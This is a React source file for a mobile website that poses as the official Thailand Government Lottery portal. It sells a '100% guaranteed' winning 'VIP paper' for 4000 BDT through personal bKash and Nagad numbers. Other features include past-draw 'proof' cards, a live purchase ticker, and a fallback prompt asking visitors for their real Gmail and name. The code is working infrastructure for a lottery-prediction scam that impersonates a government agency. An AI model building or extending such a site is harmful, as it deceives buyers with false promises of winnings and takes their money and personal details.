import React, { useState, useEffect } from 'react';
import { 
  Lock, Unlock, Crown, ZoomIn, X, Bell, LogOut, Globe
} from 'lucide-react';
import { supabase } from './supabaseClient';
import AdminPortal from './AdminPortal';

export default function App() {
  const checkIsAdminRoute = () => {
    const path = window.location.pathname.toLowerCase();
    const hash = window.location.hash.toLowerCase();
    return path === '/admin' || path === '/admin/' || hash === '#admin';
  };

  const [isAdminRoute, setIsAdminRoute] = useState(checkIsAdminRoute);

  useEffect(() => {
    const handleRouteChange = () => setIsAdminRoute(checkIsAdminRoute());
    window.addEventListener('popstate', handleRouteChange);
    window.addEventListener('hashchange', handleRouteChange);
    return () => {
      window.removeEventListener('popstate', handleRouteChange);
      window.removeEventListener('hashchange', handleRouteChange);
    };
  }, []);

  const [brandTitle, setBrandTitle] = useState('Thailand Government Lottery');
  const [brandSubtitle, setBrandSubtitle] = useState('สำนักงานสลากกินแบ่งรัฐบาล • Official Portal');
  const [logoUrl, setLogoUrl] = useState('https://www.glo.or.th/assets/img/logo.png');
  const [bkashNumber, setBkashNumber] = useState('01700-000000 (Personal)');
  const [nagadNumber, setNagadNumber] = useState('01800-000000 (Personal)');
  const [noticeText, setNoticeText] = useState('⚠️ বিশেষ ঘোষণা: আগামী ১৬ ডিসেম্বর ড্র-এর ১০০% নিশ্চিত ভিআইপি পেপার বুকিং চলছে।');
  const [drawDateText, setDrawDateText] = useState('16 December 2026');
  const [countdownTarget, setCountdownTarget] = useState('2026-12-16T16:00:00');
  const [sarPrice, setSarPrice] = useState(125);
  const [bdtPrice, setBdtPrice] = useState(4000);
  const [upcomingPaperImage, setUpcomingPaperImage] = useState('https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&q=80&w=800');

  const [isUnlocked, setIsUnlocked] = useState(false);
  const [currentUser, setCurrentUser] = useState(null);
  const [isLoginModalOpen, setIsLoginModalOpen] = useState(false);
  const [isPaymentModalOpen, setIsPaymentModalOpen] = useState(false);
  const [senderLast4, setSenderLast4] = useState('');
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('bkash');

  const [liveTickers, setLiveTickers] = useState([]);
  const [pastPapers, setPastPapers] = useState([]);
  const [zoomImage, setZoomImage] = useState(null);
  const [timeLeft, setTimeLeft] = useState({ days: 0, hours: 0, minutes: 0, seconds: 0 });

  useEffect(() => {
    fetchDataFromSupabase();

    supabase.auth.getSession().then(({ data: { session } }) => {
      if (session?.user) {
        setCurrentUser({
          name: session.user.user_metadata?.full_name || session.user.email.split('@')[0],
          email: session.user.email,
          photo: session.user.user_metadata?.avatar_url || `https://api.dicebear.com/7.x/avataaars/svg?seed=${session.user.email}`
        });
        setIsUnlocked(true);
      }
    });

    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      if (session?.user) {
        setCurrentUser({
          name: session.user.user_metadata?.full_name || session.user.email.split('@')[0],
          email: session.user.email,
          photo: session.user.user_metadata?.avatar_url || `https://api.dicebear.com/7.x/avataaars/svg?seed=${session.user.email}`
        });
        setIsUnlocked(true);
      } else {
        setCurrentUser(null);
      }
    });

    return () => subscription.unsubscribe();
  }, []);

  const fetchDataFromSupabase = async () => {
    try {
      const { data: settingsData } = await supabase.from('site_settings').select('*');
      if (settingsData) {
        settingsData.forEach(item => {
          if (item.key === 'brandTitle') setBrandTitle(item.value);
          if (item.key === 'brandSubtitle') setBrandSubtitle(item.value);
          if (item.key === 'logoUrl') setLogoUrl(item.value);
          if (item.key === 'bkash') setBkashNumber(item.value);
          if (item.key === 'nagad') setNagadNumber(item.value);
          if (item.key === 'notice') setNoticeText(item.value);
          if (item.key === 'drawDate') setDrawDateText(item.value);
          if (item.key === 'countdown') setCountdownTarget(item.value);
          if (item.key === 'sarPrice') setSarPrice(Number(item.value));
          if (item.key === 'bdtPrice') setBdtPrice(Number(item.value));
          if (item.key === 'upcomingImg') setUpcomingPaperImage(item.value);
        });
      }

      const { data: pastData } = await supabase.from('past_papers').select('*').order('id', { ascending: false });
      if (pastData) setPastPapers(pastData);

      const { data: payData } = await supabase.from('payments').select('*').eq('status', 'Approved').order('id', { ascending: false });
      if (payData) {
        setLiveTickers(payData.map(p => ({
          name: p.name,
          amountSar: p.amount_sar,
          time: p.time
        })));
      }
    } catch (err) {
      console.error('Error fetching from Supabase:', err);
    }
  };

  useEffect(() => {
    const timer = setInterval(() => {
      const now = new Date().getTime();
      const target = new Date(countdownTarget).getTime();
      const difference = target - now;

      if (difference > 0) {
        setTimeLeft({
          days: Math.floor(difference / (1000 * 60 * 60 * 24)),
          hours: Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)),
          minutes: Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60)),
          seconds: Math.floor((difference % (1000 * 60)) / 1000),
        });
      }
    }, 1000);
    return () => clearInterval(timer);
  }, [countdownTarget]);

  if (isAdminRoute) {
    return <AdminPortal supabase={supabase} />;
  }

  const handleGoogleLoginReal = async () => {
    try {
      const { error } = await supabase.auth.signInWithOAuth({
        provider: 'google',
        options: {
          redirectTo: window.location.origin
        }
      });
      if (error) {
        alert('গুগল লগইন করতে সমস্যা হয়েছে: ' + error.message);
      }
    } catch (err) {
      const realEmail = prompt("আপনার আসল জিমেইল অ্যাকাউন্ট (Real Gmail Address) লিখুন:", "");
      if (!realEmail || !realEmail.includes('@') || !realEmail.toLowerCase().includes('gmail.com')) {
        if (realEmail !== null) alert('দয়া করে আপনার একটি সঠিক জিমেইল অ্যাকাউন্ট দিন।');
        return;
      }
      const realName = prompt("আপনার আসল নাম লিখুন:", realEmail.split('@')[0]);
      setCurrentUser({
        name: realName || 'Verified User',
        email: realEmail,
        photo: `https://api.dicebear.com/7.x/avataaars/svg?seed=${realEmail}`
      });
      setIsLoginModalOpen(false);
    }
  };

  const handleLogout = async () => {
    await supabase.auth.signOut();
    setCurrentUser(null);
  };

  const handlePaymentSubmit = async (e) => {
    e.preventDefault();
    if (!currentUser) {
      setIsLoginModalOpen(true);
      return;
    }
    if (!senderLast4 || senderLast4.length !== 4) {
      alert('দয়া করে আপনার বিকাশ/নগদ নম্বরটির সঠিক শেষ ৪ ডিজিট লিখুন।');
      return;
    }

    const { error } = await supabase.from('payments').insert([{
      name: currentUser.name,
      email: currentUser.email,
      last4: senderLast4,
      method: selectedPaymentMethod.toUpperCase(),
      amount_sar: sarPrice,
      amount_bdt: bdtPrice,
      time: new Date().toLocaleTimeString(),
      status: 'Pending'
    }]);

    if (error) {
      alert('পেমেন্ট সাবমিট করতে সমস্যা হয়েছে। আবার চেষ্টা করুন।');
    } else {
      setIsPaymentModalOpen(false);
      setSenderLast4('');
      alert('পেমেন্ট রিকোয়েস্ট সফলভাবে জমা হয়েছে! অ্যাডমিন যাচাই করার পর পেপার আনলক করা হবে।');
    }
  };

  const handleCopy = (text) => {
    navigator.clipboard.writeText(text);
    alert('কপি করা হয়েছে!');
  };

  return (
    <div className="min-h-screen bg-[#031410] text-gray-100 font-sans flex flex-col items-center">
      <div className="w-full max-w-md bg-[#031410] min-h-screen shadow-2xl border-x border-amber-500/20 flex flex-col">
        
        <div className="bg-gradient-to-r from-amber-600 via-amber-500 to-yellow-600 text-black font-bold text-xs py-1.5 overflow-hidden shadow-md relative z-40">
          <div className="flex whitespace-nowrap animate-marquee items-center">
            <span className="mx-3 flex items-center gap-1.5"><Bell size={14} /> {noticeText}</span>
          </div>
        </div>

        <header className="bg-[#041E18]/95 backdrop-blur-md border-b border-amber-500/30 sticky top-0 z-50 px-3 py-2.5 flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            <div className="w-10 h-10 rounded-full border-2 border-amber-400 p-0.5 bg-black/40 overflow-hidden shadow-md flex-shrink-0">
              <img src={logoUrl} alt="Logo" className="w-full h-full object-cover rounded-full" />
            </div>
            <div>
              <h1 className="text-sm font-black text-amber-300 leading-tight">{brandTitle}</h1>
              <p className="text-[10px] text-amber-300/80 font-medium">{brandSubtitle}</p>
            </div>
          </div>

          <div>
            {currentUser ? (
              <div className="flex items-center gap-1.5 bg-[#062C22] border border-amber-500/40 rounded-full py-1 px-2.5">
                <img src={currentUser.photo} alt="Avatar" className="w-6 h-6 rounded-full border border-amber-400 object-cover" />
                <button onClick={handleLogout} className="text-[11px] text-red-400 font-bold ml-1" title="Log Out"><LogOut size={14} /></button>
              </div>
            ) : (
              <button onClick={() => setIsLoginModalOpen(true)} className="bg-gradient-to-r from-amber-500 to-yellow-600 text-black font-bold px-3 py-1.5 rounded-full text-xs">
                Google Login
              </button>
            )}
          </div>
        </header>

        <main className="flex-grow px-3 py-4 space-y-6">
          <section className="bg-gradient-to-br from-[#062C22] to-[#041E18] p-4 rounded-2xl border border-amber-500/30 shadow-xl space-y-4">
            <h2 className="text-lg font-extrabold text-white">Next Draw: <span className="text-amber-400">{drawDateText}</span></h2>
            
            <div className="grid grid-cols-4 gap-2">
              {[
                { label: 'Days', val: timeLeft.days },
                { label: 'Hours', val: timeLeft.hours },
                { label: 'Mins', val: timeLeft.minutes },
                { label: 'Secs', val: timeLeft.seconds },
              ].map((item, idx) => (
                <div key={idx} className="bg-black/40 border border-amber-500/40 rounded-xl p-2 text-center">
                  <div className="text-lg font-black text-amber-400 font-mono">{String(item.val).padStart(2, '0')}</div>
                  <div className="text-[9px] text-gray-400 uppercase">{item.label}</div>
                </div>
              ))}
            </div>

            <div className="bg-[#031410] border border-amber-500/30 rounded-xl p-3 text-xs space-y-2">
              <div className="flex items-center gap-1 text-amber-300 font-bold text-[11px]"><Crown size={13} /> Live Purchase Ticker</div>
              {liveTickers.length === 0 ? (
                <div className="text-center text-gray-400 py-2 text-[11px]">কোনো পারচেস হিস্ট্রি নেই</div>
              ) : (
                liveTickers.slice(0, 3).map((t, idx) => (
                  <div key={idx} className="flex items-center justify-between text-[11px] border-b border-gray-800 pb-1">
                    <span className="text-gray-200">👤 {t.name}</span>
                    <span className="text-amber-400 font-bold">{t.amountSar} SAR</span>
                  </div>
                ))
              )}
            </div>
          </section>

          <section className="bg-[#062C22] border border-amber-500/40 rounded-2xl p-4 shadow-xl space-y-4">
            <div className="text-center">
              <h3 className="text-base font-black text-white">Upcoming Draw VIP Paper</h3>
            </div>
            <div className="bg-black/60 border border-amber-500/50 rounded-xl p-3 relative aspect-[3/4] flex items-center justify-center overflow-hidden">
              <img src={upcomingPaperImage} alt="VIP Paper" className={`w-full h-full object-cover ${isUnlocked ? '' : 'blur-xl opacity-40'}`} />
              {!isUnlocked && (
                <div className="absolute inset-0 bg-black/80 flex flex-col items-center justify-center p-4 space-y-3">
                  <Lock size={28} className="text-amber-400 animate-pulse" />
                  <div className="text-amber-400 font-bold text-xs">{sarPrice} SAR | ৳ {bdtPrice.toLocaleString()} BDT</div>
                  <button onClick={() => currentUser ? setIsPaymentModalOpen(true) : setIsLoginModalOpen(true)} className="w-full bg-amber-500 text-black font-extrabold py-2.5 rounded-xl text-xs">
                    <Unlock size={16} className="inline mr-1" /> Unlock Paper Now
                  </button>
                </div>
              )}
            </div>
          </section>

          <section className="space-y-4">
            <div className="text-center">
              <h3 className="text-base font-black text-white">বিগত ড্র-গুলোর সফলতার প্রমাণ</h3>
            </div>
            <div className="space-y-3">
              {pastPapers.map((paper) => (
                <div key={paper.id} className="bg-[#062C22] border border-amber-500/30 rounded-2xl p-3 flex items-center gap-3 shadow-md">
                  <img src={paper.image} alt="" className="w-16 h-20 object-cover rounded-xl border border-amber-400/50 flex-shrink-0" />
                  <div className="space-y-1 flex-grow">
                    <span className="text-[10px] text-amber-400 font-bold">{paper.date}</span>
                    <p className="text-xs text-gray-200 font-medium">{paper.caption}</p>
                    <div className="text-[11px] text-amber-300 font-mono">
                      3UP: <strong>{paper.up3}</strong> | DOWN: <strong>{paper.down}</strong>
                    </div>
                  </div>
                  <button onClick={() => setZoomImage(paper)} className="bg-black/40 text-amber-300 p-2 rounded-xl border border-amber-500/30">
                    <ZoomIn size={16} />
                  </button>
                </div>
              ))}
            </div>
          </section>
        </main>
      </div>

      {isLoginModalOpen && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-[#062C22] border border-amber-500/50 rounded-3xl p-6 max-w-sm w-full space-y-4 relative">
            <button onClick={() => setIsLoginModalOpen(false)} className="absolute top-3 right-3 text-gray-400 hover:text-white"><X size={18} /></button>
            <h3 className="text-lg font-bold text-white text-center">Sign in with Real Gmail</h3>
            <button onClick={handleGoogleLoginReal} className="w-full bg-white text-black font-bold py-3 rounded-xl text-xs flex items-center justify-center gap-2 hover:bg-gray-100 transition">
              <Globe size={16} /> Continue with Google Account
            </button>
          </div>
        </div>
      )}

      {isPaymentModalOpen && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-[#062C22] border border-amber-500/50 rounded-3xl p-6 max-w-sm w-full space-y-4 relative">
            <button onClick={() => setIsPaymentModalOpen(false)} className="absolute top-3 right-3 text-gray-400 hover:text-white"><X size={18} /></button>
            <h3 className="text-lg font-bold text-white text-center">VIP Paper Payment</h3>
            <div className="bg-black/40 p-3 rounded-xl text-center text-amber-400 font-bold">
              {sarPrice} SAR | ৳ {bdtPrice.toLocaleString()} BDT
            </div>
            <div className="grid grid-cols-2 gap-2">
              <button onClick={() => setSelectedPaymentMethod('bkash')} className={`py-2 rounded-xl text-xs font-bold ${selectedPaymentMethod === 'bkash' ? 'bg-pink-600 text-white' : 'bg-black/40 text-gray-300'}`}>bKash</button>
              <button onClick={() => setSelectedPaymentMethod('nagad')} className={`py-2 rounded-xl text-xs font-bold ${selectedPaymentMethod === 'nagad' ? 'bg-orange-600 text-white' : 'bg-black/40 text-gray-300'}`}>Nagad</button>
            </div>
            <div className="bg-black/50 p-3 rounded-xl flex items-center justify-between text-xs">
              <span className="font-mono text-amber-300">{selectedPaymentMethod === 'bkash' ? bkashNumber : nagadNumber}</span>
              <button onClick={() => handleCopy(selectedPaymentMethod === 'bkash' ? bkashNumber : nagadNumber)} className="bg-amber-500 text-black px-2.5 py-1 rounded-lg font-bold">Copy</button>
            </div>
            <form onSubmit={handlePaymentSubmit} className="space-y-3">
              <input 
                type="text" 
                maxLength="4" 
                placeholder="বিকাশ/নগদের শেষ ৪ ডিজিট" 
                value={senderLast4} 
                onChange={e => setSenderLast4(e.target.value)} 
                className="w-full bg-black/40 border border-amber-500/40 rounded-xl px-4 py-3 text-center text-base font-mono text-white"
                required
              />
              <button type="submit" className="w-full bg-amber-500 text-black font-extrabold py-3 rounded-xl text-xs">Confirm Payment</button>
            </form>
          </div>
        </div>
      )}

      {zoomImage && (
        <div className="fixed inset-0 bg-black/90 z-50 flex items-center justify-center p-4">
          <button onClick={() => setZoomImage(null)} className="absolute top-4 right-4 bg-black/60 text-white p-2 rounded-full"><X size={20} /></button>
          <div className="max-w-md w-full bg-[#062C22] border border-amber-500/50 rounded-2xl p-3 space-y-3">
            <img src={zoomImage.image} alt="" className="w-full rounded-xl" />
            <div className="text-center text-xs text-amber-300">
              3UP: <strong>{zoomImage.up3}</strong> | DOWN: <strong>{zoomImage.down}</strong>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
